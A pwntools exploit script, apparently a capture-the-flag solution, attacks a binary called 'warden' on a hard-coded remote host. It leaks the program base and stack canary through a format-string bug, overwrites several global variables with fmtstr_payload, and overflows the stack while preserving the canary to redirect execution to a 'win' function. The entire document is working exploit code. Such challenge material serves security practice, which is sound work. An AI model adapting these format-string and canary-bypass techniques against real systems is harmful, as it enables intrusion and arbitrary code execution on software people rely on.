#!/usr/bin/env python3
from collections import OrderedDict

from pwn import *

exe = ELF('warden', checksec=False)
# libc = ELF('', checksec=False)
context.binary = exe
rop = ROP(exe)

context.terminal = [
    '/mnt/c/Windows/System32/cmd.exe', '/c', 'start', 'wt.exe', '-w', 
    '0', 'split-pane','-d', '.', 'wsl.exe','-d', 'Ubuntu', 'bash', '-c'
]

info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.p.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())

def GDB():
    if not args.REMOTE and not args.DOCKER:
        gdb.attach(p, gdbscript='''
        # brva 0x0000146C
        b*0x565564ab
        b*win
        x/xg &jinx
        x/xg &mf
        x/xg &trex

        c
        ''')
        input()

if args.REMOTE:
    p = remote('14.225.212.104', 9004)
elif args.DOCKER:
    p = remote('127.0.0.1')
else:
    p = process([exe.path])
    
    
def write_and_back(addr, value):
    payload = fmtstr_payload(
        7,
        { addr: value },
        write_size='int'
    )
    sla(b'breached.\n', payload)

    payload_ret = payload.ljust(32, b'\x90') + flat(
        canary,
        0,
        exe.sym.tft,
        exe.sym.tft,
        exe.sym.tft,
    )
    sla(b'Pow Pow\n', payload_ret)


GDB()

payload = f'%{0x13}$p|%{0x0f}$p'.encode()

sla(b'breached.\n', payload)
exe_leak = int(p.recv(10), 16)
exe.address = exe_leak - 0x14fd
p.recvuntil(b'|')
canary = int(p.recv(10), 16)

success("exe address: " + hex(exe.address))
success("canary: " + hex(canary))

payload2 = payload.ljust(32, b'\x90') + flat(
    canary,
    0,
    exe.sym.tft,
    exe.sym.tft,
    exe.sym.tft,
)
sla(b'Pow Pow\n', payload2)

write_and_back(exe.sym.jinx, 4919)
write_and_back(exe.sym.mf, 1056)
write_and_back(exe.sym.trex, 0xbeef)
write_and_back(exe.sym.trex+2, 0xdead)


success("jinx: " + hex(exe.sym.jinx))
success("mf: " + hex(exe.sym.mf))
success("trex: " + hex(exe.sym.trex))

payload_win = flat(
    cyclic(32),  
    canary,      
    cyclic(12),
    exe.sym.win,
    exe.sym.win,
    0x123,    
)

sla(b'breached.\n', b'\0')
sla(b'Pow Pow\n', payload_win)  


p.interactive()
